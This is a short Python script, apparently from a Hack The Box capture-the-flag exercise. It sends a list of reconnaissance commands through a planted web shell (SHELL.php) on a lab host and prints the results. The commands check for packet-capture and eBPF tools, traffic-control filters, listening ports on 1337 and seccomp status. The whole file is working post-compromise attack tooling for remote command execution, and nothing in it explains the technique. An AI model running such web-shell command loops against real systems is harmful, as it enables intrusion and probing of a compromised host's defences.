import urllib.request, urllib.parse, base64

cmds = [
    "which tcpdump ss bpftool tc 2>&1",
    "tcpdump -h 2>&1 | head -1",
    "bpftool prog list 2>&1 | head -20",
    "tc qdisc show dev lo 2>&1",
    "tc filter show dev lo 2>&1",
    "cat /proc/net/tcp 2>&1 | grep -i 1337",
    "ss -tlnp 2>&1 | grep 1337",
    # Check for SECCOMP filters
    "cat /proc/1499/status 2>&1 | grep -i seccomp",
    "cat /proc/self/status 2>&1 | grep -i seccomp",
    "cat /proc/1/status 2>&1 | grep -i seccomp",
]

for cmd in cmds:
    url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": cmd})
    headers = {"Host": "support_001.enigma.htb"}
    req = urllib.request.Request(url, headers=headers)
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        result = resp.read().decode("utf-8", errors="replace").strip()
        if result:
            print(f"=== {cmd[:60]} ===")
            print(result[:500])
            print()
    except Exception as e:
        pass
